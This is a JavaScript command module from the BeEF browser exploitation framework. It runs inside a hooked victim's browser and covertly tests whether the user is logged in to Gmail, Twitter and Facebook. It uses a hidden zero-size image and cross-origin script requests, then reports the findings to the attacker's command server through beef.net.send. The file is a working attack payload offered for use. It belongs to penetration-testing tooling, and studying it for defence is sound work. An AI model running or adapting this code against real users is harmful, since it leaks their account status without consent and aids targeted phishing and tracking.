//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var facebookresult = "";
	var twitterresult = "";
	
	if (document.getElementById('gmailimg')) {
		return "Img has already been created";
	}
	
	var img = new Image();
	img.setAttribute("style","visibility:hidden");
	img.setAttribute("width","0");
	img.setAttribute("height","0");
	img.src = 'https://mail.google.com/mail/photos/static/AD34hIiQyJTs5FhsJ1mhFdK9wx4OZU2AgLNZLBbk2zMHYPUfs-ZzXPLq2s2vdBmgnJ6SoUCeBbFnjRlPUDXw860gsEDSKPrhBJYDgDBCd7g36x2tuBQc0TM?'+ new Date();
	img.id = 'gmailimg';
	img.setAttribute("attr","start");
	img.onerror = function() {
		this.setAttribute("attr","error");
	};
	img.onload = function() {
		this.setAttribute("attr","load");
	};

	
	document.body.appendChild(img);
	
	$j.ajax({
		url: "https://twitter.com/account/use_phx?setting=false&amp;format=text",
		dataType: "script",
		cache: "false",
		complete: function(one, two) {
			if (two == "success") {
				twitterresult = "User is NOT authenticated to Twitter (response:"+two+")";
			} else if (two == "timeout") {
				twitterresult = "User is authenticated to Twitter (response:"+two+")";
			}
		},
		timeout: <%= @timeout %>
	});
	
	$j.ajax({
		url: "https://www.facebook.com/imike3",
		dataType: "script",
		cache: "false",
		error: function(one, two, three) {
			facebookresult = "User is NOT authenticated to Facebook";
		},
		success: function(one, two, three) {
			facebookresult = "User is authenticated to Facebook";
		},
		timeout: <%= @timeout %>
	});

	setTimeout(function() {
		var img2 = document.getElementById('gmailimg');	
		if (img2.getAttribute("attr") == "error") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'gmail=User is NOT authenticated to GMail&twitter='+twitterresult+'&facebook='+facebookresult);
		} else if (img2.getAttribute("attr") == "load") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'gmail=User is authenticated to GMail&twitter='+twitterresult+'&facebook='+facebookresult);
		} else if (img2.getAttribute("attr") == "start") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'gmail=Browser timed out. Cannot determine if user is authenticated to GMail&twitter='+twitterresult+'&facebook='+facebookresult);
		};
		document.body.removeChild(img2);
		img = null;
		img2 = null;
		}, <%= @timeout %>+3000);

});
